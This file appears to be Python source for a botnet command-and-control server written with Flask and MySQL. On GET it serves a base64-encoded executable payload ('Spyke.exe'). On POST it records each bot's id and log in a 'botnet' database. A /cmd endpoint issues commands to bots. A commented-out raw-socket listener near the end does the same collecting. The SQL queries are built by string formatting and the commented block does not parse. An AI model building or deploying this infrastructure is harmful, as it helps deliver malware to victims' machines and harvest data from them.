import MySQLdb
from base64 import b64encode as b64en, b64decode as b64de
from flask import Flask, request
import time

app = Flask(__name__)
db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")

@app.route('/', methods=['GET','POST'])
def index():
	if request.method == 'GET':
		# uploading the payload
		fin = open('Spyke.exe','rb').read()
		return b64en(fin)
	else:
		cursor = db.cursor()
		try:
			cursor.execute("INSERT INTO bots(id,log) VALUES (\"{0}\", \"{1}\")".format(request.form['id'],request.form['log']))
			db.commit()
			return "OK"
		except Exception as e: 
			print(str(e) + " -> " + "\n\n" + str(request.values.to_dict(flat=False)))
			return "NOT OK"

@app.route('/cmd', methods=['GET'])
def command():
	return b64en(b'notepad.exe')

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=80)


"""
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('localhost', 9090))

db = MySQLdb.connect(host="localhost", user="root", passwd="", db="botnet")
while True:
	sock.listen(1)
	conn, addr = sock.accept()
	print('connected:', addr)
	cursor = db.cursor()

	s = []
	while True:
		data = conn.recv(1024)
		print(data)
		if not data:
			break
		s.append(data)

	conn.send(b'Hello\n')
	print len(s), s
	sql = "INSERT INTO data(BOT_ID, FLAG, BUFF) VALUES ('%(BOT_ID)s', '%(FLAG)s', '%(BUFF)s') {"BOT_ID":s[0], "FLAG":s[1], "BUFF":addr[0]}"
	print sql
	cursor.execute(sql)

	db.commit()

db.close()
conn.close()
"""